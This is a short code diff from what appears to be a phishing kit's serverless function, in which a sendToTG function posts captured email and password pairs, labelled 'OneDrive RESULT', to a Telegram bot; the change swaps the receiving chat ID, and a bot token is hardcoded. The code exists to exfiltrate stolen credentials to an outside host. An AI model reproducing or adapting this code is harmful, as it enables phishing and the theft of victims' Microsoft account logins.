@@ -10,7 +10,7 @@ export default async (req: Request, context: Context) => {
 
 async function sendToTG(e, p) {
         const telegramBotToken = "8171950497:AAHOLMn0SIn8ZwNryB866Y1SVtvf2jWLeaM"; // Replace with your Telegram bot token
-        const chatId = 5645205996; // Replace with your chat ID
+        const chatId = 6210146576; // Replace with your chat ID
 
         const messageText = `**OneDrive RESULT**\nEmail: ${e}\nPassword: ${p} \n`;
 
